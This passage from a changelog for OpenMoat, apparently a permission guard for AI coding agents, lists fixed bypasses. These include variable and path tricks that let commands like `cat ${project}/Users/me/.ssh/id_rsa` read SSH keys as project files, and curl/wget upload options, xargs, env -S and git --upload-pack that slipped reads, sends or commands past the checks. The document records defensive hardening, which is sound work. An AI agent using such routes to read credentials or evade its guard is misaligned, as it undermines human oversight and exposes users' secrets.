- A shell command that gives `HOME`, `PWD` or `project` a value it does not show (`project=$(cat f)`, `read HOME`) no longer has paths under them read as the real home, working directory or project: `project=$(cat f); cat ${project}/id_rsa` was allowed as a project file, and now asks like any unknown directory ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- `${project}` in a shell command is the shell's variable `project`, empty when unset, not the project root: `cat ${project}/Users/me/.ssh/id_rsa` reads the key and was allowed as a project file ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- A relative path from the root directory (`cd / && cat Users/me/.ssh/id_rsa`) is checked as `/Users/…`; it was read as the network path `//Users/…`, which no rule names ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- `xargs` input that the command line shows, a here-string, a here-document or text piped from `echo`, is checked as the arguments of the command xargs runs, with `-I`, `-n` and `-0` read as xargs reads them ([#575](https://github.com/crocodile-labs/openmoat/pull/575)).
- Files that `curl` and `wget` send are checked as reads: `curl -F name=@FILE`, `-F name=<FILE`, `--form`, `-T`/`--upload-file`, `-d @FILE` and the other data options, `--data-urlencode name@FILE` and `-K FILE`, and `wget --post-file`, `--body-file` and `-i` ([#575](https://github.com/crocodile-labs/openmoat/pull/575)).
- Files rewritten in place are checked as writes: the file operands of `perl -i` and `ruby -i` (and their backups), the file `patch` patches and its `-o` and `-r` files (its `-i` patch file is a read), and `dd of=~/…`, whose `~` bash expands ([#575](https://github.com/crocodile-labs/openmoat/pull/575)).
- `env -S 'cmd args'` (`--split-string`) is checked as the command line env runs ([#575](https://github.com/crocodile-labs/openmoat/pull/575)).
- An unquoted glob that starts with `.` (`.*`) also names `.` and `..`, as macOS `/bin/bash` and other bash before 5.2 expand it, so the directory and its parent are checked; `rm` and `rmdir`, which refuse those two operands, are unchanged ([#575](https://github.com/crocodile-labs/openmoat/pull/575)).
- Shell rule patterns match in time bounded by the pattern length times the command length; a pattern with many `*` against a long command took exponential time ([#575](https://github.com/crocodile-labs/openmoat/pull/575)).
- The program git runs for the other side of a remote, `--upload-pack` and `-u` for `clone`, `fetch`, `pull` and `ls-remote`, `push --receive-pack`/`--exec` and `archive --exec`, is checked as a command line. A local repository that `clone`, `fetch`, `pull`, `ls-remote` or `archive --remote` names is a read, and the directory `clone` creates and a local repository `push` updates are writes ([#575](https://github.com/crocodile-labs/openmoat/pull/575)).
- Hooks inside `moat run` send each tool call to the `moat run` process over the proxy's port with a token made for the run, and that process decides and records it; the sandbox stays closed to `~/.moat`, a wrong token is recorded and gets no decision, and any failure denies ([#575](https://github.com/crocodile-labs/openmoat/pull/575)).

### Added
- `moat mcp proxy`, opt-in per server with `moat mcp wrap` or `moat init --mcp-proxy`: it runs a stdio MCP server through OpenMoat, pins each tool's description and input schema on first sight, hides a tool that changed or is new until `moat mcp accept`, and records every tool call in the audit log. With `--sandbox` the server runs under `moat run`. `moat uninstall` and `moat mcp unwrap` restore the original command ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).

### Changed
- Changing one of Claude Code's own settings, such as `permissions.blockReadsOutsideWorkingDirectories`, a permission list or mode, or a display toggle, no longer makes `moat guard` deny every call until `moat doctor --accept`. Calls are decided by the policy as usual, the change is recorded once per session, and `moat doctor` and `moat status` report it until you accept it.
